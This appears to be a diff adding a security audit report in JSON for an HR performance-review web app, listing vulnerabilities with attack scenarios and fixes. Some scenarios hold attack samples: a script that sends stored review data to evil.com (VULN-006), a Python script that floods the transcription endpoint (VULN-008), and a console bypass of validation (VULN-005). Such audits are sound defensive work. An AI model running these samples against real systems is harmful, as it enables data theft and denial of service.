@@ -1,0 +1,488 @@
+{
+  "timestamp": "2025-12-09T00:00:00Z",
+  "application": "HR Performance Scoring Web Application (TSS PPM)",
+  "version": "1.2.1",
+  "assessment_type": "Code-Level Vulnerability Analysis",
+  "vulnerabilities": [
+    {
+      "id": "VULN-001",
+      "threat_id": "THREAT-002",
+      "title": "Complete Absence of Authentication Mechanism",
+      "severity": "Critical",
+      "cwe": "CWE-287",
+      "file": "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\contexts\\FormContext.jsx",
+      "line_start": 38,
+      "line_end": 245,
+      "code_snippet": "export function FormProvider({ children }) {\n  const [sessionCode, setSessionCode] = useState(() => generateSessionCode());\n  const [formData, setFormData] = useState(createInitialFormData);\n  // ... NO authentication checks, NO user validation, NO access control",
+      "description": "The application has zero authentication or authorization controls. The FormContext manages all session data without any user identity verification. Any person with access to the device can access, modify, or delete any session stored in localStorage. There are no login requirements, no user roles, no session ownership validation, and no mechanism to verify who is accessing the data.",
+      "attack_scenario": "1. Attacker gains physical access to a manager's computer (shared office, unattended laptop)\n2. Opens browser and navigates to the application\n3. Opens DevTools → Application → Local Storage → hr_performance_sessions\n4. Reads all performance review data in plaintext including employee names, scores, confidential comments\n5. Can modify data directly or copy session codes to access later\n6. No audit trail exists to detect this access",
+      "impact": "Complete compromise of confidentiality and integrity. Attackers can read all performance reviews, modify scores, alter comments, or delete sessions. This violates employee privacy rights and could lead to fraudulent performance evaluations.",
+      "remediation": "Implement authentication system:\n1. Add user login/registration with secure password storage (bcrypt/argon2)\n2. Associate sessions with user IDs\n3. Implement session ownership validation:\n\n```javascript\nfunction validateSessionOwner(sessionCode, userId) {\n  const session = loadSession(sessionCode);\n  if (!session || session.ownerId !== userId) {\n    throw new Error('Unauthorized access');\n  }\n  return session;\n}\n```\n\n4. Add role-based access control for managers vs employees\n5. Implement proper session management with httpOnly cookies",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/287.html",
+        "https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication"
+      ]
+    },
+    {
+      "id": "VULN-002",
+      "threat_id": "THREAT-003",
+      "title": "Unencrypted Sensitive Data in localStorage with No Integrity Checks",
+      "severity": "Critical",
+      "cwe": "CWE-311",
+      "file": "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\utils\\session.js",
+      "line_start": 33,
+      "line_end": 39,
+      "code_snippet": "function saveAllSessions(sessions) {\n  try {\n    localStorage.setItem(STORAGE_KEY, JSON.stringify(sessions));\n  } catch (e) {\n    console.error('Error saving sessions to localStorage:', e);\n  }\n}",
+      "description": "All session data including highly sensitive employee performance information is stored in plaintext in localStorage with no encryption and no integrity verification. The data includes employee names, performance scores (1-3), competency ratings, manager confidential comments, and self-assessments. Anyone with DevTools access can read and modify this data without detection. No HMAC, digital signatures, or checksums exist to detect tampering.",
+      "attack_scenario": "1. Employee knows their session code from a previous review\n2. Opens browser DevTools → Application → Local Storage\n3. Locates hr_performance_sessions key\n4. Edits JSON directly to change performance scores from 1 to 3\n5. Modifies competency ratings to inflate HOW score\n6. Adjusts goal weights to favor higher-scored goals\n7. Application loads tampered data with no integrity validation\n8. Downloads fraudulent DOCX report with inflated scores",
+      "impact": "Data tampering and privacy breach. Employees can manipulate their own performance scores. Malicious actors can access confidential performance data of all employees on the device. Browser sync may leak data across devices. No way to detect or prevent data modification.",
+      "remediation": "Implement encryption and integrity protection:\n\n```javascript\nimport { encrypt, decrypt, generateHMAC, verifyHMAC } from './crypto';\n\nfunction saveAllSessions(sessions) {\n  try {\n    const data = JSON.stringify(sessions);\n    const hmac = generateHMAC(data, secretKey);\n    const encrypted = encrypt(data, encryptionKey);\n    const payload = { data: encrypted, hmac };\n    localStorage.setItem(STORAGE_KEY, JSON.stringify(payload));\n  } catch (e) {\n    console.error('Error saving sessions:', e);\n  }\n}\n\nfunction getAllSessions() {\n  try {\n    const stored = localStorage.getItem(STORAGE_KEY);\n    if (!stored) return {};\n    const payload = JSON.parse(stored);\n    if (!verifyHMAC(payload.data, payload.hmac, secretKey)) {\n      throw new Error('Data integrity check failed');\n    }\n    const decrypted = decrypt(payload.data, encryptionKey);\n    return JSON.parse(decrypted);\n  } catch (e) {\n    console.error('Error reading sessions:', e);\n    return {};\n  }\n}\n```\n\nUse Web Crypto API for encryption. Note: Key management is complex in client-side apps; consider server-side storage for production.",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/311.html",
+        "https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure",
+        "https://developer.mozilla.org/en-US/docs/Web/API/Web_Crypto_API"
+      ]
+    },
+    {
+      "id": "VULN-003",
+      "threat_id": "THREAT-008",
+      "title": "Plaintext Storage of Confidential Performance Review Data",
+      "severity": "Critical",
+      "cwe": "CWE-312",
+      "file": "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\utils\\session.js",
+      "line_start": 74,
+      "line_end": 84,
+      "code_snippet": "export function saveSession(sessionCode, formData) {\n  const sessions = getAllSessions();\n\n  sessions[sessionCode] = {\n    ...formData,\n    timestamp: Date.now(),\n    lastModified: new Date().toISOString()\n  };\n\n  saveAllSessions(sessions);\n}",
+      "description": "The saveSession function stores complete form data including employeeName, role, summary, goals with descriptions, competencyScores, competencyNotes, selfAssessment, and comments fields in plaintext in localStorage. This data persists for 14 days unencrypted and is accessible via browser DevTools or file system access to browser profile directories.",
+      "attack_scenario": "1. IT administrator accesses manager's browser profile directory\n2. Navigates to Chrome/Edge Local Storage folder\n3. Opens .leveldb files with SQLite browser\n4. Searches for 'hr_performance_sessions' key\n5. Extracts all JSON data containing multiple employees' reviews\n6. Reads confidential comments like 'Employee has attitude problems, considering termination'\n7. No encryption protects this sensitive data at rest",
+      "impact": "Massive privacy violation. Confidential employee performance data including negative feedback, termination considerations, salary recommendations, and personal improvement plans are exposed in plaintext. Violates GDPR data protection requirements and employee privacy rights.",
+      "remediation": "Same as VULN-002. Additionally:\n1. Implement data minimization - only store necessary data\n2. Add explicit user consent for localStorage usage\n3. Provide data export and deletion features (GDPR rights)\n4. Consider server-side storage with TLS encryption in transit\n5. Implement automatic data purging after 14 days (already exists but enforce cryptographically)",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/312.html",
+        "https://gdpr-info.eu/art-32-gdpr/",
+        "https://owasp.org/www-community/vulnerabilities/Unencrypted_Data"
+      ]
+    },
+    {
+      "id": "VULN-004",
+      "threat_id": "THREAT-001",
+      "title": "Weak Session Code Generation Enabling Enumeration",
+      "severity": "High",
+      "cwe": "CWE-330",
+      "file": "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\utils\\session.js",
+      "line_start": 10,
+      "line_end": 13,
+      "code_snippet": "export function generateSessionCode() {\n  const uuid = uuidv4().replace(/-/g, '').toUpperCase();\n  return uuid.substring(0, 10);\n}",
+      "description": "Session codes are generated by taking the first 10 characters of a UUID v4 and converting to uppercase alphanumeric. This reduces the keyspace from UUID's 128 bits to approximately 52 bits (36^10 = 3.6 quadrillion combinations). While still large, this is within reach of targeted enumeration attacks, especially when combined with no rate limiting on session access and predictable timing (14-day windows during annual review periods).",
+      "attack_scenario": "1. Attacker knows company conducts annual reviews in December\n2. Creates automated script to enumerate session codes\n3. Uses pattern: [A-Z0-9]{10}\n4. Calls loadSession() for each generated code\n5. With 1000 attempts/second, can try ~86 million codes/day\n6. During peak review period, probability of collision increases\n7. Successfully loads unauthorized session data\n8. No rate limiting or lockout mechanism exists",
+      "impact": "Unauthorized access to performance review sessions. Attackers can access other employees' or managers' sessions by guessing valid codes. Combined with no authentication, this allows lateral movement between sessions.",
+      "remediation": "1. Use full UUID v4 (32 characters) or cryptographically secure random tokens:\n\n```javascript\nimport { randomBytes } from 'crypto'; // Node.js or use Web Crypto API\n\nexport function generateSessionCode() {\n  // Generate 16 bytes = 128 bits of entropy\n  const bytes = randomBytes(16);\n  return bytes.toString('base64url'); // URL-safe base64, ~22 chars\n}\n```\n\n2. Implement rate limiting on session access:\n\n```javascript\nconst accessAttempts = new Map();\n\nfunction checkRateLimit(ip) {\n  const attempts = accessAttempts.get(ip) || { count: 0, resetTime: Date.now() };\n  if (Date.now() > attempts.resetTime) {\n    attempts.count = 0;\n    attempts.resetTime = Date.now() + 60000; // 1 minute window\n  }\n  attempts.count++;\n  accessAttempts.set(ip, attempts);\n  if (attempts.count > 10) {\n    throw new Error('Rate limit exceeded');\n  }\n}\n```\n\n3. Add session expiry/lockout after failed access attempts",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/330.html",
+        "https://owasp.org/www-community/vulnerabilities/Insufficient_Session-ID_Length",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html"
+      ]
+    },
+    {
+      "id": "VULN-005",
+      "threat_id": "THREAT-004",
+      "title": "Client-Side Validation Bypass via Browser Console",
+      "severity": "High",
+      "cwe": "CWE-602",
+      "file": "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\components\\Actions.jsx",
+      "line_start": 26,
+      "line_end": 33,
+      "code_snippet": "const handleDownload = async (isDraft = false) => {\n  if (!isDraft) {\n    const validation = validate();\n    if (!validation.isValid) {\n      alert(t('validation.formIncomplete'));\n      return;\n    }\n  }",
+      "description": "All validation logic runs exclusively on the client side. The validateForm function in scoring.js checks that weights sum to 100%, all goals are scored, and competencies are complete. However, an attacker can bypass these checks by modifying the validation function in browser memory or directly calling generateReport() with invalid data.",
+      "attack_scenario": "1. Employee fills out performance review but goals weights sum to 95% (invalid)\n2. Validation prevents download\n3. Opens browser DevTools → Console\n4. Types: document.querySelector('.action-button.primary').onclick = async () => { await generateReport(formData, sessionCode, false); }\n5. Or modifies validateForm in Sources panel to always return {isValid: true}\n6. Clicks download button\n7. Generates DOCX report with invalid data (weights not summing to 100%)\n8. No server-side validation exists to catch this",
+      "impact": "Data integrity violation. Fraudulent reports can be generated with invalid data, manipulated scores, or bypassed business rules like the VETO rule (if ANY competency = 1, HOW score = 1). This undermines the entire performance review process.",
+      "remediation": "1. Move critical validation to server-side:\n\n```javascript\n// Server endpoint\napp.post('/api/generate-report', authenticate, async (req, res) => {\n  const { formData, sessionCode } = req.body;\n  \n  // Server-side validation (can't be bypassed)\n  const validation = validateForm(formData);\n  if (!validation.isValid) {\n    return res.status(400).json({ error: 'Invalid form data', errors: validation.errors });\n  }\n  \n  // Generate report server-side\n  const report = await generateReport(formData, sessionCode);\n  res.send(report);\n});\n```\n\n2. Sign validation results:\n\n```javascript\nconst validation = validate();\nif (!validation.isValid) return;\nconst signature = await signData(JSON.stringify(formData));\nif (!await verifySignature(formData, signature)) {\n  throw new Error('Data tampered with');\n}\n```\n\n3. Accept that client-side validation is UX only, not security",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/602.html",
+        "https://owasp.org/www-community/vulnerabilities/Improper_Data_Validation",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html"
+      ]
+    },
+    {
+      "id": "VULN-006",
+      "threat_id": "THREAT-012",
+      "title": "Missing Content Security Policy Headers",
+      "severity": "High",
+      "cwe": "CWE-1021",
+      "file": "C:\\Users\\s.vanas\\Projects\\tss_ppm\\nginx.conf",
+      "line_start": 1,
+      "line_end": 48,
+      "code_snippet": "server {\n    listen 80;\n    server_name _;\n    root /usr/share/nginx/html;\n    index index.html;\n    # ... NO CSP headers defined\n}",
+      "description": "The nginx.conf file lacks Content Security Policy (CSP) headers. CSP is a critical defense-in-depth mechanism that prevents XSS attacks by restricting which scripts can execute. The application loads an external analytics script from plausible.io without Subresource Integrity (SRI) validation. If the Plausible CDN is compromised or MITM'd, malicious JavaScript could execute with full DOM access.",
+      "attack_scenario": "1. Attacker compromises Plausible.io CDN or performs MITM attack on CDN connection\n2. Replaces legitimate analytics script with malicious payload:\n\n```javascript\n// Malicious script at plausible.io/js/pa-OVp2RFVy8CfsubEwNvi3F.js\nconst data = localStorage.getItem('hr_performance_sessions');\nfetch('https://evil.com/exfiltrate', {\n  method: 'POST',\n  body: data\n});\n```\n\n3. Manager loads the application\n4. Malicious script executes (no CSP to block it)\n5. All localStorage data including confidential reviews exfiltrated to attacker server\n6. Could also inject keylogger to capture voice transcriptions",
+      "impact": "Complete compromise via XSS. Malicious scripts can read localStorage, intercept form submissions, capture voice input transcriptions, modify the DOM, or redirect users to phishing pages. Without CSP, there's no browser-level protection against script injection.",
+      "remediation": "Add CSP headers to nginx.conf:\n\n```nginx\nlocation / {\n    try_files $uri $uri/ /index.html;\n    \n    # Content Security Policy\n    add_header Content-Security-Policy \"default-src 'self'; script-src 'self' https://plausible.io; connect-src 'self' https://plausible.io; img-src 'self' data:; style-src 'self' 'unsafe-inline'; font-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none';\" always;\n    \n    # Other security headers\n    add_header X-Content-Type-Options \"nosniff\" always;\n    add_header X-Frame-Options \"DENY\" always;\n    add_header X-XSS-Protection \"1; mode=block\" always;\n    add_header Referrer-Policy \"strict-origin-when-cross-origin\" always;\n}\n```\n\nAnd add SRI to index.html:\n\n```html\n<script async src=\"https://plausible.io/js/pa-OVp2RFVy8CfsubEwNvi3F.js\" \n        integrity=\"sha384-HASH_HERE\" \n        crossorigin=\"anonymous\"></script>\n```\n\nGenerate SRI hash: https://www.srihash.org/",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/1021.html",
+        "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html"
+      ]
+    },
+    {
+      "id": "VULN-007",
+      "threat_id": "THREAT-007",
+      "title": "DOCX Reports Lack Digital Signatures and Tamper Protection",
+      "severity": "High",
+      "cwe": "CWE-345",
+      "file": "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\utils\\docxGenerator.js",
+      "line_start": 1,
+      "line_end": 100,
+      "code_snippet": "export async function generateReport(formData, sessionCode, isDraft) {\n  // ... generates DOCX document\n  // NO digital signature\n  // NO watermark\n  // NO tamper detection\n  const blob = await Packer.toBlob(doc);\n  saveAs(blob, filename);\n}",
+      "description": "Generated DOCX reports contain no digital signatures, cryptographic hashes, or watermarks to verify authenticity. The reports include session code and date in the footer as plain text, but these can be easily modified in Microsoft Word or LibreOffice. There's no mechanism to detect if a report has been altered after generation or to verify that it was generated by the legitimate application.",
+      "attack_scenario": "1. Employee generates legitimate performance report with scores: Goal 1: 2, Goal 2: 1, Goal 3: 2\n2. Downloads DOCX file: 'Performance_Review_JOHN_DOE_2025-12-09.docx'\n3. Opens file in Microsoft Word\n4. Modifies Goal 2 score from 1 to 3\n5. Changes WHAT Score from 1.8 to 2.6\n6. Updates 9-grid position from Orange to Green\n7. Modifies manager comments to be more positive\n8. Saves file with same name\n9. Submits modified report to HR\n10. No way for HR to verify report authenticity or detect tampering",
+      "impact": "Report authenticity cannot be verified. Employees can fraudulently modify their performance reports after generation. Managers can repudiate reports they created. HR cannot trust the accuracy of submitted reports. Legal disputes over performance reviews have no verifiable evidence.",
+      "remediation": "1. Add digital signatures using crypto libraries:\n\n```javascript\nimport { createSign } from 'crypto'; // or use Web Crypto API\n\nexport async function generateReport(formData, sessionCode, isDraft) {\n  const doc = createDocument(formData, sessionCode, isDraft);\n  \n  // Generate cryptographic hash of form data\n  const dataHash = await generateSHA256(JSON.stringify(formData));\n  \n  // Sign the hash with private key\n  const signature = await signData(dataHash, privateKey);\n  \n  // Add signature and verification instructions to footer\n  const footer = new Paragraph({\n    children: [\n      new TextRun({ text: `Session: ${sessionCode} | Generated: ${new Date().toISOString()}`, size: 16 }),\n      new TextRun({ text: `\\nVerification Hash: ${dataHash}`, size: 14 }),\n      new TextRun({ text: `\\nSignature: ${signature}`, size: 14 }),\n      new TextRun({ text: `\\nVerify at: https://app.tss.com/verify`, size: 14 })\n    ]\n  });\n  \n  // Generate blob\n  const blob = await Packer.toBlob(doc);\n  saveAs(blob, filename);\n}\n```\n\n2. Create verification endpoint:\n\n```javascript\napp.post('/api/verify-report', async (req, res) => {\n  const { dataHash, signature } = req.body;\n  const isValid = await verifySignature(dataHash, signature, publicKey);\n  res.json({ valid: isValid });\n});\n```\n\n3. Add visible watermark with QR code linking to verification page\n4. Store report metadata server-side for audit purposes",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/345.html",
+        "https://owasp.org/www-community/controls/Digital_Signature",
+        "https://www.w3.org/TR/xmldsig-core/"
+      ]
+    },
+    {
+      "id": "VULN-008",
+      "threat_id": "THREAT-014",
+      "title": "Whisper Server Lacks Authentication and Rate Limiting",
+      "severity": "High",
+      "cwe": "CWE-306",
+      "file": "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\server\\whisper_server_faster.py",
+      "line_start": 87,
+      "line_end": 94,
+      "code_snippet": "@app.route('/transcribe', methods=['POST'])\ndef transcribe():\n    \"\"\"\n    Transcribe audio file to text.\n    Expects multipart form data with:\n    - audio: audio file (webm, mp3, wav, etc.)\n    - language: language code (optional, e.g., 'en', 'nl', 'es')\n    \"\"\"\n    if 'audio' not in request.files:\n        return jsonify({'error': 'No audio file provided'}), 400",
+      "description": "The /transcribe endpoint has no authentication mechanism and no rate limiting. Any client can POST audio files to the server, even without valid session codes or user credentials. Combined with the 50MB file size limit and CPU-intensive Whisper processing (up to 300s timeout), this creates a severe DoS vulnerability. The CORS configuration (line 17: CORS(app)) allows cross-origin requests without restrictions.",
+      "attack_scenario": "1. Attacker discovers /transcribe endpoint (exposed via nginx proxy)\n2. Creates automated script to flood endpoint:\n\n```python\nimport requests\nimport concurrent.futures\n\ndef attack():\n    files = {'audio': ('bomb.wav', open('50mb_audio.wav', 'rb'))}\n    requests.post('https://app.tss.com/transcribe', files=files)\n\nwith concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:\n    executor.map(attack, range(1000))\n```\n\n3. Each request triggers CPU-intensive Whisper processing\n4. Server memory (4GB limit) exhausted with 8-10 concurrent requests\n5. Container crashes or becomes unresponsive\n6. Legitimate users cannot use voice input feature\n7. No authentication or rate limit prevents this abuse",
+      "impact": "Denial of Service. Attackers can exhaust server resources making the application unusable. Resource abuse (compute costs if cloud-hosted). Could be used to disrupt critical review periods. No accountability since no authentication exists.",
+      "remediation": "1. Add API key authentication:\n\n```python\nfrom functools import wraps\nimport os\n\nAPI_KEY = os.environ.get('WHISPER_API_KEY')\n\ndef require_api_key(f):\n    @wraps(f)\n    def decorated_function(*args, **kwargs):\n        api_key = request.headers.get('X-API-Key')\n        if not api_key or api_key != API_KEY:\n            return jsonify({'error': 'Unauthorized'}), 401\n        return f(*args, **kwargs)\n    return decorated_function\n\n@app.route('/transcribe', methods=['POST'])\n@require_api_key\ndef transcribe():\n    # ... existing code\n```\n\n2. Implement rate limiting:\n\n```python\nfrom flask_limiter import Limiter\nfrom flask_limiter.util import get_remote_address\n\nlimiter = Limiter(\n    app=app,\n    key_func=get_remote_address,\n    default_limits=[\"100 per hour\"]\n)\n\n@app.route('/transcribe', methods=['POST'])\n@limiter.limit(\"10 per minute\")\n@require_api_key\ndef transcribe():\n    # ... existing code\n```\n\n3. Add request validation and stricter file size limits\n4. Implement request queuing to prevent resource exhaustion\n5. Add monitoring and alerting for abuse patterns",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/306.html",
+        "https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html"
+      ]
+    },
+    {
+      "id": "VULN-009",
+      "threat_id": "THREAT-015",
+      "title": "Unsafe Audio File Processing with ffmpeg Command Injection Risk",
+      "severity": "High",
+      "cwe": "CWE-78",
+      "file": "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\server\\whisper_server_faster.py",
+      "line_start": 51,
+      "line_end": 63,
+      "code_snippet": "def convert_audio_to_wav(input_path, output_path):\n    \"\"\"Convert audio file to WAV format using ffmpeg if available, otherwise try librosa.\"\"\"\n    try:\n        # Try ffmpeg first (handles more formats)\n        result = subprocess.run(\n            ['ffmpeg', '-i', input_path, '-ar', '16000', '-ac', '1', '-y', output_path],\n            capture_output=True,\n            text=True\n        )\n        if result.returncode == 0:\n            return True\n    except FileNotFoundError:\n        pass  # ffmpeg not installed",
+      "description": "The server uses subprocess.run to execute ffmpeg on user-uploaded audio files without proper input validation. File extension validation is minimal (based on filename only, line 110-113). While the current implementation uses a list of arguments (preventing shell injection), malicious audio files exploiting ffmpeg vulnerabilities (CVEs) could lead to arbitrary code execution or DoS. No file type validation via magic numbers exists. Audio bombs (highly compressed files expanding to gigabytes) are not detected.",
+      "attack_scenario": "1. Attacker crafts malicious audio file exploiting known ffmpeg vulnerability (e.g., CVE-2021-38114, CVE-2022-2566)\n2. File appears as valid .webm but contains exploit payload\n3. POSTs file to /transcribe endpoint\n4. ffmpeg processes malicious file triggering buffer overflow\n5. Attacker gains code execution inside Docker container running as root (see VULN-012)\n6. Can escape container to compromise host system\n7. Alternative: Audio bomb .webm (100KB) decompresses to 10GB causing OOM crash",
+      "impact": "Potential Remote Code Execution if ffmpeg vulnerability is exploited. Denial of Service via malformed audio files or audio bombs. Container compromise could lead to data exfiltration or lateral movement in the infrastructure.",
+      "remediation": "1. Add file magic number validation:\n\n```python\nimport magic\n\nALLOWED_MIME_TYPES = ['audio/webm', 'audio/wav', 'audio/mpeg', 'audio/ogg']\n\n@app.route('/transcribe', methods=['POST'])\ndef transcribe():\n    audio_file = request.files['audio']\n    \n    # Validate file type by magic number\n    file_type = magic.from_buffer(audio_file.read(2048), mime=True)\n    audio_file.seek(0)\n    \n    if file_type not in ALLOWED_MIME_TYPES:\n        return jsonify({'error': 'Invalid file type'}), 400\n    \n    # ... rest of code\n```\n\n2. Set resource limits for ffmpeg:\n\n```python\nimport resource\n\ndef set_ffmpeg_limits():\n    # Limit CPU time to 30 seconds\n    resource.setrlimit(resource.RLIMIT_CPU, (30, 30))\n    # Limit memory to 512MB\n    resource.setrlimit(resource.RLIMIT_AS, (512 * 1024 * 1024, 512 * 1024 * 1024))\n\nresult = subprocess.run(\n    ['ffmpeg', '-i', input_path, '-ar', '16000', '-ac', '1', '-y', output_path],\n    preexec_fn=set_ffmpeg_limits,  # Apply limits before exec\n    capture_output=True,\n    timeout=30\n)\n```\n\n3. Keep ffmpeg updated to latest version\n4. Run ffmpeg in sandboxed environment (seccomp, AppArmor)\n5. Validate audio duration and size before processing",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/78.html",
+        "https://owasp.org/www-community/attacks/Command_Injection",
+        "https://nvd.nist.gov/vuln/detail/CVE-2021-38114"
+      ]
+    },
+    {
+      "id": "VULN-010",
+      "threat_id": "THREAT-009",
+      "title": "Sensitive Data Logging to Browser Console",
+      "severity": "Medium",
+      "cwe": "CWE-532",
+      "file": "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\hooks\\useWhisper.js",
+      "line_start": 224,
+      "line_end": 224,
+      "code_snippet": "console.log('Transcription result:', text);",
+      "description": "The application logs sensitive voice transcription results to the browser console. When managers use voice input to dictate confidential performance comments, the full transcribed text is logged via console.log(). Console logs persist in browser history and DevTools, making them accessible to anyone who opens the browser's developer tools. Similar logging exists in useVoiceInput.js (line 216), useBrowserWhisper.js (line 168), and WhisperContext.jsx (line 191).",
+      "attack_scenario": "1. Manager dictates confidential comment: 'Employee shows poor performance, considering termination. Attendance issues documented.'\n2. Voice input successfully transcribes and inserts text into form\n3. Full text logged to console: console.log('Transcription result:', 'Employee shows poor performance...')\n4. Later, employee uses same computer\n5. Opens DevTools → Console\n6. Scrolls through console history\n7. Finds confidential manager feedback about themselves or colleagues\n8. No way to clear or prevent this log persistence",
+      "impact": "Information disclosure. Confidential manager feedback, employee self-assessments, and performance comments are exposed via console logs. Violates privacy and could create hostile work environment if employees access logs about themselves.",
+      "remediation": "1. Remove all sensitive data logging in production:\n\n```javascript\n// Create debug logger that only logs in development\nconst logger = {\n  log: (message, data) => {\n    if (import.meta.env.DEV) {\n      console.log(message, data);\n    }\n  },\n  error: (message, error) => {\n    // Always log errors but sanitize sensitive data\n    console.error(message, error.message || error);\n  }\n};\n\n// Replace console.log with:\nlogger.log('Transcription completed', { length: text.length }); // Log metadata only\n```\n\n2. Use build-time stripping:\n\n```javascript\n// vite.config.js\nexport default {\n  define: {\n    __DEV__: JSON.stringify(process.env.NODE_ENV === 'development')\n  },\n  esbuild: {\n    drop: process.env.NODE_ENV === 'production' ? ['console', 'debugger'] : []\n  }\n}\n```\n\n3. Add CSP header to block inline scripts that might capture console logs",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/532.html",
+        "https://owasp.org/www-community/vulnerabilities/Information_exposure_through_query_strings_in_url",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html"
+      ]
+    },
+    {
+      "id": "VULN-011",
+      "threat_id": "THREAT-005",
+      "title": "Client-Side Timestamp Manipulation for Session Extension",
+      "severity": "Medium",
+      "cwe": "CWE-471",
+      "file": "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\utils\\session.js",
+      "line_start": 46,
+      "line_end": 51,
+      "code_snippet": "function isSessionExpired(session) {\n  if (!session?.timestamp) return true;\n\n  const expiryTime = SESSION_EXPIRY_DAYS * 24 * 60 * 60 * 1000;\n  return Date.now() - session.timestamp > expiryTime;\n}",
+      "description": "The 14-day session expiration mechanism relies entirely on client-side validation of the timestamp field stored in localStorage. Users can open localStorage in DevTools, modify the timestamp value to Date.now(), effectively resetting the 14-day countdown. This bypasses the intended data retention policy and allows indefinite persistence of sensitive performance data.",
+      "attack_scenario": "1. Manager creates performance review session on 2025-01-01\n2. Session timestamp: 1735689600000 (2025-01-01 00:00:00 UTC)\n3. On day 13 (2025-01-13), session about to expire\n4. Manager opens DevTools → Application → Local Storage\n5. Finds session object: {\"employeeName\": \"John Doe\", \"timestamp\": 1735689600000, ...}\n6. Changes timestamp to: 1736812800000 (2025-01-14 00:00:00 UTC - current date)\n7. Session expiry reset to 14 days from now\n8. Repeats process indefinitely to retain data beyond 14-day policy\n9. Violates GDPR data minimization and retention requirements",
+      "impact": "Data retention policy bypass. Sensitive performance data can persist indefinitely, violating GDPR Article 5(1)(e) storage limitation principle. Organization cannot guarantee data deletion after 14 days as stated in privacy policy.",
+      "remediation": "1. Move session management to server-side with server-controlled expiration\n2. If client-side storage required, cryptographically sign timestamps:\n\n```javascript\nimport { generateHMAC } from './crypto';\n\nexport function saveSession(sessionCode, formData) {\n  const sessions = getAllSessions();\n  const timestamp = Date.now();\n  const timestampHMAC = generateHMAC(timestamp.toString(), secretKey);\n  \n  sessions[sessionCode] = {\n    ...formData,\n    timestamp,\n    timestampHMAC,\n    lastModified: new Date().toISOString()\n  };\n  \n  saveAllSessions(sessions);\n}\n\nfunction isSessionExpired(session) {\n  if (!session?.timestamp || !session?.timestampHMAC) return true;\n  \n  // Verify timestamp integrity\n  const expectedHMAC = generateHMAC(session.timestamp.toString(), secretKey);\n  if (session.timestampHMAC !== expectedHMAC) {\n    console.error('Timestamp tampering detected');\n    return true; // Treat as expired if tampered\n  }\n  \n  const expiryTime = SESSION_EXPIRY_DAYS * 24 * 60 * 60 * 1000;\n  return Date.now() - session.timestamp > expiryTime;\n}\n```\n\n3. Implement server-side cleanup job that purges data after 14 days\n4. Add explicit user consent for data retention duration",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/471.html",
+        "https://gdpr-info.eu/art-5-gdpr/",
+        "https://owasp.org/www-community/vulnerabilities/Insufficient_Transport_Layer_Protection"
+      ]
+    },
+    {
+      "id": "VULN-012",
+      "threat_id": "THREAT-023",
+      "title": "Docker Containers Running as Root User",
+      "severity": "High",
+      "cwe": "CWE-250",
+      "file": "C:\\Users\\s.vanas\\Projects\\tss_ppm\\Dockerfile.whisper",
+      "line_start": 1,
+      "line_end": 52,
+      "code_snippet": "FROM python:3.11-slim\n\nWORKDIR /app\n# ... installation and setup ...\n# NO USER directive - runs as root by default\nCMD [\"gunicorn\", ...]",
+      "description": "Both Dockerfile.whisper and Dockerfile.frontend lack USER directives, causing containers to run as root (UID 0) by default. If an attacker exploits a vulnerability in the Whisper server (e.g., ffmpeg exploit from VULN-009) or nginx, they gain root privileges inside the container. This makes container escape easier and provides full control over the container filesystem, allowing malware persistence or lateral movement.",
+      "attack_scenario": "1. Attacker exploits ffmpeg vulnerability (VULN-009) in Whisper container\n2. Gains code execution as root user inside container\n3. Downloads container escape exploit (e.g., CVE-2019-5736 runc vulnerability)\n4. Escapes container to compromise Docker host\n5. Accesses other containers and host filesystem\n6. Installs backdoor in container image for persistence\n7. Exfiltrates data from all containers and host\n8. Root privileges make all of this easier than if running as unprivileged user",
+      "impact": "Privilege escalation. Container compromise with root privileges significantly increases attack surface. Easier container escape, malware persistence, and lateral movement. Violates principle of least privilege and container security best practices.",
